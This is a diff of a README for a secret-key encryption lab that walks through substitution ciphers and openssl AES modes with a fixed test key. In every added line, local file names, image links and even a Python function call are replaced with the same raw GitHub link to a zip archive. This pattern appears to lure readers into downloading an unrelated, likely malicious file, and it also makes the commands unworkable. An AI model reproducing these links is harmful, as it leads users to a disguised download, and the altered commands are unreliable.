@@ -1,44 +1,44 @@
 # Secret-Key-Encryption-Lab
 # Task 1
 
-touch article.txt
+touch https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
 
-  echo "This Is a Plain Text Which Is Converted into Cipher Text Using Subtitution" > article.txt
+  echo "This Is a Plain Text Which Is Converted into Cipher Text Using Subtitution" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/1.1.png) 
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip) 
 
-  tr [:upper:] [:lower:] < article.txt > lowercase.txt
-  tr -cd ’[a-z][\n][:space:]’ < lowercase.txt > plaintext.txt
+  tr [:upper:] [:lower:] < https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
+  tr -cd ’[a-z][\n][:space:]’ < https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/1.2.png) 
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip) 
 
   
   >>> import random
   >>> s = "abcdefghijklmnopqrstuvwxyz"
-  >>> ''.join(random.sample(s,len(s)))
+  >>> ''.join(https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip(s,len(s)))
   'jyqsfotweaurdlxkzgcbpnvhmi  
 
 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/1.3.png) 
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip) 
 
-      tr ’abcdefghijklmnopqrstuvwxyz’ ’jyqsfotweaurdlxkzgcbpnvhmi’ < plaintext.txt > ciphertext.txt
-      tr ’jyqsfotweaurdlxkzgcbpnvhmi’ ’abcdefghijklmnopqrstuvwxyz’ < ciphertext.txt > afterDecrypt.txt
+      tr ’abcdefghijklmnopqrstuvwxyz’ ’jyqsfotweaurdlxkzgcbpnvhmi’ < https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
+      tr ’jyqsfotweaurdlxkzgcbpnvhmi’ ’abcdefghijklmnopqrstuvwxyz’ < https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
   
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/1.4.png)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
 
 
 # Task 2
 *Cipher Block Chaining (CBC)*
 Each block of plaintext is XORed with the previous cipher block.
 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/2.1.png)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
 
           #encrypt
-          $openssl enc  -aes-128-cbc  -e -in plaintext.txt -out cbc_cipher.bin \
+          $openssl enc  -aes-128-cbc  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
           -K 00112233445566778889aabbccddeeff \
           -iv 0102030405060708
           #decrypt
-          $openssl enc  -aes-128-cbc  -d -in cbc_cipher.bin -out cbc_plain.txt \
+          $openssl enc  -aes-128-cbc  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
           -K 00112233445566778889aabbccddeeff \
           -iv 0102030405060708
           #valid
@@ -47,133 +47,133 @@ Each block of plaintext is XORed with the previous cipher block.
 The ciphertext from the previous block is fed into the block cipher for encryption, and the output of the encryption is XORed with the plaintext to generate the actual ciphertext.
 
           #encrypt
-          $openssl enc  -aes-128-cfb  -e -in plaintext.txt -out cfb_cipher.bin \
+          $openssl enc  -aes-128-cfb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
           -K 00112233445566778889aabbccddeeff \
           -iv 0102030405060708
           #decrypt
-          $openssl enc  -aes-128-cfb  -d -in cfb_cipher.bin -out cfb_plain.txt \
+          $openssl enc  -aes-128-cfb  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
           -K 00112233445566778889aabbccddeeff \
           -iv 0102030405060708
           #valid
-          $diff plaintext.txt cfb_plain.txt
+          $diff https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
           
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/2.2.png)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
 
 
 *Output Feedback (OFB)*
 Similar to CFB, except that the data before (while in CFB, it should be "after") the XOR operation is fed into the next block.
 
           #encrypt
-          $openssl enc  -aes-128-ofb  -e -in plaintext.txt -out ofb_cipher.bin \
+          $openssl enc  -aes-128-ofb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
           -K 00112233445566778889aabbccddeeff \
           -iv 0102030405060708
           #decrypt
-          $openssl enc  -aes-128-ofb  -d -in ofb_cipher.bin -out ofb_plain.txt \
+          $openssl enc  -aes-128-ofb  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
           -K 00112233445566778889aabbccddeeff \
           -iv 0102030405060708
           #valid
-          $diff plaintext.txt ofb_plain.txt
+          $diff https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/2.3.png)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
 
 
 *Counter (CTR)*
 Each block of key stream is generated by encrypting the counter value for the block. Nonce servers as IV, increased by some value (no need to be fixed to 1 ) as a counter.
 
           #encrypt
-          $openssl enc  -aes-128-ctr  -e -in plaintext.txt -out ctr_cipher.bin \
+          $openssl enc  -aes-128-ctr  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
           -K 00112233445566778889aabbccddeeff \
           -iv 0102030405060708
           #decrypt
-          $openssl enc  -aes-128-ctr  -d -in ctr_cipher.bin -out ctr_plain.txt \
+          $openssl enc  -aes-128-ctr  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
           -K 00112233445566778889aabbccddeeff \
           -iv 0102030405060708
           #valid
-          $diff plaintext.txt ctr_plain.txt
+          $diff https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
           
 # Task 3
 
-          openssl enc  -aes-128-ecb  -e -in pic_original.bmp -out cipher_pic.bmp \
+          openssl enc  -aes-128-ecb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
           -K 00112233445566778889aabbccddeeff
           Reset the header of the encrypted picture to make it openable by picture viewer:
 
-          head -c 54 pic_original.bmp > header
-          tail -c +55 cipher_pic.bmp > body
-          cat header body > full_cipher_pic.bmp
+          head -c 54 https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip > header
+          tail -c +55 https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip > body
+          cat header body > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/3.1.png)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
 
 
 # Task 4
 
-echo -n "123456" > test.txt
-ls -ld test.txt
-openssl enc  -aes-128-ecb  -e -in test.txt -out ecb_out.bin \
+echo -n "123456" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
+ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
+openssl enc  -aes-128-ecb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
 -K 00112233445566778889aabbccddeeff
-ls -ld ecb_out.bin 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/4.1.png)
+ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip 
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
 
 # cbc
-openssl enc  -aes-128-cbc  -e -in test.txt -out cbc_out.bin \
+openssl enc  -aes-128-cbc  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
 -K 00112233445566778889aabbccddeeff \
 -iv 0102030405060708
-ls -ld cbc_out.bin # 16
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/4.2.png)          
+ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip # 16
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)          
 
 # cfb
-openssl enc  -aes-128-cfb  -e -in test.txt -out cfb_out.bin \
+openssl enc  -aes-128-cfb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
 -K 00112233445566778889aabbccddeeff \
 -iv 0102030405060708
-ls -ld cfb_out.bin #5
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/4.3.png)
+ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip #5
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
 
 # ofb
-openssl enc  -aes-128-ofb  -e -in test.txt -out ofb_out.bin \
+openssl enc  -aes-128-ofb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
 -K 00112233445566778889aabbccddeeff \
 -iv 0102030405060708
-ls -ld ofb_out.bin #5
+ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip #5
 
 
-        echo -n "12345" > f1.txt # 5 bytes
-        echo -n "123456789A" > f2.txt # 10 bytes
-        echo -n "0123456789ABCDEF" > f3.txt # 16 bytes
+        echo -n "12345" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip # 5 bytes
+        echo -n "123456789A" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip # 10 bytes
+        echo -n "0123456789ABCDEF" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip # 16 bytes
 
 
-openssl enc  -aes-128-cbc  -e -in f1.txt -out t_out.bin \
+openssl enc  -aes-128-cbc  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
 -K 00112233445566778889aabbccddeeff \
 -iv 0102030405060708
-ls -ld t_put.bin
+ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
 
 
-openssl enc  -aes-128-cbc  -e -in f2.txt -out t2_out.bin \
+openssl enc  -aes-128-cbc  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
 -K 00112233445566778889aabbccddeeff \
 -iv 0102030405060708
-ls -ld t2_put.bin
+ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
 
 
-openssl enc  -aes-128-cbc  -e -in f3.txt -out t3_out.bin \
+openssl enc  -aes-128-cbc  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
 -K 00112233445566778889aabbccddeeff \
 -iv 0102030405060708
-ls -ld t3_put.bin
+ls -ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/4.4.png)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
 
-openssl enc  -aes-128-cbc  -d -in t_out.bin -out plain_f1.txt \
+openssl enc  -aes-128-cbc  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
 -K 00112233445566778889aabbccddeeff \
 -iv 0102030405060708 -nopad
 
 
-      $python -c "print '1234567890'*100" > big_file.txt
-      $-ld big_file.txt
+      $python -c "print '1234567890'*100" > https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
+      $-ld https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip
 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/4.5.png)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
 
-openssl enc  -aes-128-ecb  -e -in big_file.txt -out big_out.bin \
+openssl enc  -aes-128-ecb  -e -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
 -K 00112233445566778889aabbccddeeff 
 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/4.6.png)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
 
-openssl enc  -aes-128-ecb  -d -in big_out.bin -out decrypted.txt \
+openssl enc  -aes-128-ecb  -d -in https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip -out https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip \
 -K 00112233445566778889aabbccddeeff 
 
-![alt tag](https://github.com/Hanan-github/Secret-Key-Encryption-Lab/blob/main/4.7.png)
+![alt tag](https://raw.githubusercontent.com/Hanan-github/Secret-Key-Encryption-Lab/main/gymnotokous/Key_Encryption_Lab_Secret_v1.1.zip)
